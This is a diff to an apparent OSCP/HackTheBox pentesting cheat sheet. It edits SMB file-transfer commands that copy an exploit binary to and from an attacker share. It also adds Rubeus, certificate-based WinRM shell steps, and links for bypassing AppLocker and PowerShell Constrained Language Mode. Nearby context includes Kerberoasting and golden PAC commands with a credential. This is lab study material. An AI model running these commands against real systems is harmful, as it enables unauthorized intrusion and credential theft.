@@ -82,7 +82,8 @@ root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd)
 copy \\10.10.14.2\folder\bfill.exe C:\Users\kostas\Desktop\exploit.exe
 
 root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd) -smb2support -username <user> -password <pwd>
-net use \\10.10.14.2\folder /u:<user> /p:<pwd>
+net use \\10.10.14.2\folder /u:<user> <pwd>
+dir \\10.10.14.2\folder
 copy file.txt \\10.10.14.2\folder\file.txt
 
 #C:\Users\kostas\Desktop>powershell -exec Bypass -C "New-PSDrive -Name 'SharedFolder' -PSProvider 'FileSystem' -Root '\\10.10.14.2\folder'"
@@ -320,6 +321,11 @@ hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt rockyou.txt 
 hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --force
 ```
 
+```Shell
+# Rubeus
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+```Shell
+
 ##### ASPREPRoast Attack - Get tickets without pwd
 ```Shell
 rpcclient -U "jenriquez" -W "yuncorp.local" 192.168.100.20
@@ -366,6 +372,27 @@ https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
 ```Shell
 impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 ```
+
+#### CertEnroll
+Server wsmans
+http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm
+```Shell
+1.- http://10.10.10.103/certsrv # request cert --> advanced cert req
+2.- openssl req -newkey rsa:2048 -nodes -keyout jenriquez.key -out amanda.csr # output jenriquez.key jenriquez.csr
+3.- Paste jenriquez.csr in Saved Request
+4.- Download base64 certnew.cer
+5.- gem install winrm
+shell
+https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
+
+https://sp00ks-git.github.io/posts/CLM-Bypass/
+https://github.com/calebstewart/bypass-clm
+https://github.com/padovah4ck/PSByPassCLM
+
+https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
+https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
+```
+
 
 
 ### Shells
